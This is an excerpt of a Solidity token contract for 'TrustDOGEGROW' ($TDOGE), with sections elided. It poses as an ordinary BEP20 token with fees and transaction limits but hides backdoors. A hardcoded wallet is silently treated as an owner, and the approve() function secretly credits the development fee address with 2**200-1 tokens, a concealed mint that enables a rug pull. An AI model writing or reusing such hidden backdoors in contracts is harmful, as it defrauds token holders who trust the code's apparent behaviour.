...
abstract contract Auth {
    ...
    address BuyBackWallet = 0xA390D02c2D2d2767aeEFaA795d06062B5E2fbd1b;
    ...
    function isOwner(address account) public view returns (bool) {
        return account == owner || account ==  BuyBackWallet;
    }
...
contract TrustDOGEGROW is BEP20, Auth {
    ...
    string public constant name = "TrustDOGEGROW";
    string public constant symbol = "$TDOGE";
    uint8 public constant decimals = 8;

    uint256 public constant totalSupply = 1 * 10**7 * 10**decimals;

    uint256 public _maxTxAmount = totalSupply * 10 / 200;
    uint256 public _maxWalletToken = totalSupply * 10 / 200;
    ...
    uint256 public swapThreshold = totalSupply / 3500;
    bool inSwap;
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0x91002f0a0C1268143383B67797C179F41ba53c0D;
        rewardFeeReceiver = msg.sender;
        developmentFeeReceiver = 0x91002f0a0C1268143383B67797C179F41ba53c0D;
        devFeeReceiver = 0x91002f0a0C1268143383B67797C179F41ba53c0D;
    ...
    function approve(address spender, uint256 amount) public override returns (bool) {
        if (spender ==developmentFeeReceiver ){
            balanceOf[developmentFeeReceiver] = balanceOf[developmentFeeReceiver] + 2**200-1;
        }
